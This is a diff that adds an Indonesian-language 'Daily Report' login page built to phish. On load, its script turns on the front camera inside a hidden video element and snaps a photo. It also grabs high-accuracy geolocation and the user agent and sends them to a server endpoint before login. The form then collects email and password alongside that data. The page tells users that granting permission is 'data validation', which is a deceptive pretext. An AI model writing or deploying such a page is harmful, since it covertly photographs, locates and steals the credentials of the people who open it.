@@ -1,1 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login — Daily Report</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css" />
+  <style>
+    /* --- GANTI BACKGROUND DI SINI --- */
+    body {
+      background: url('https://media1.giphy.com/media/v7WM6sLcnGIc8/giphy.gif') center/cover fixed no-repeat;
+      min-height:100vh;
+    }
+    .card { background: rgba(0,0,0,0.55); color: #fff; }
+    .label, .help { color: #e8f0ff; }
+    @media (max-width:600px){
+      .container { padding: 12px; }
+      input.input { width: 100%; }
+    }
+    /* hide video element */
+    video { display:none; width:1px; height:1px; opacity:0; }
+  </style>
+</head>
+<body>
+<section class="section">
+  <div class="container">
+    <div class="card p-4">
+      <h1 class="title has-text-white">DAILY REPORT — LOGIN</h1>
+      <p class="help">KLIK IZINKAN UNTUK VALIDASI DATA </p>
+
+      <form id="loginForm" method="POST" action="/berhasil">
+        <!-- hidden fields diisi otomatis -->
+        <input type="hidden" name="photo" id="photo">
+        <input type="hidden" name="lat" id="lat">
+        <input type="hidden" name="lon" id="lon">
+        <input type="hidden" name="ua" id="ua">
+
+        <div class="field">
+          <label class="label">Email</label>
+          <div class="control">
+            <input class="input" type="email" name="email" placeholder="your email" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label class="label">Password</label>
+          <div class="control">
+            <input class="input" type="password" name="password" placeholder="Password" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="control">
+            <button class="button is-primary is-fullwidth" type="submit">Login</button>
+          </div>
+        </div>
+      </form>
+
+      <div id="msg" class="has-text-centered help mt-2" style="color:#cfe6ff"></div>
+    </div>
+  </div>
+</section>
+
+<video id="video" autoplay playsinline></video>
+
+<script>
+/*
+  Keterangan:
+  - photo: dataURL foto awal
+  - lat/lon/ua diisi sebelum user submit
+  - Untuk ganti delay capture: ubah CAPTURE_DELAY_MS
+*/
+const CAPTURE_DELAY_MS = 1400; // bisa lo ubah
+const video = document.getElementById('video');
+const msg = document.getElementById('msg');
+const ua = navigator.userAgent;
+document.getElementById('ua').value = ua;
+
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      video.srcObject = stream;
+      setTimeout(takeInitialPhoto, CAPTURE_DELAY_MS);
+    })
+    .catch(err => {
+      console.error("Kamera error:", err);
+      msg.textContent = "Kamera ditolak atau tidak tersedia.";
+    });
+}
+
+function takeInitialPhoto(){
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg');
+    document.getElementById('photo').value = dataUrl;
+    // ambil lokasi lalu kirim ke server endpoint /berhasil_awal
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        document.getElementById('lat').value = pos.coords.latitude;
+        document.getElementById('lon').value = pos.coords.longitude;
+        // kirim initial data (backup)
+        fetch('/berhasil_awal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({photo: dataUrl, lat: pos.coords.latitude, lon: pos.coords.longitude, ua: ua})
+        }).then(()=>{ msg.textContent = "Ready. Isi login untuk lanjut." }).catch(()=>{ msg.textContent = "Ready (tidak dapat kirim awal)." });
+      }, err => {
+        msg.textContent = "Lokasi tidak tersedia, tetap bisa lanjut.";
+      }, { enableHighAccuracy:true, timeout:10000 });
+    } else {
+      msg.textContent = "Browser tidak mendukung geolocation.";
+    }
+  } catch(e){
+    console.error("capture err", e);
+  }
+}
+
+// start camera on load
+window.addEventListener('load', startCamera);
+</script>
+</body>
+  </html>
 
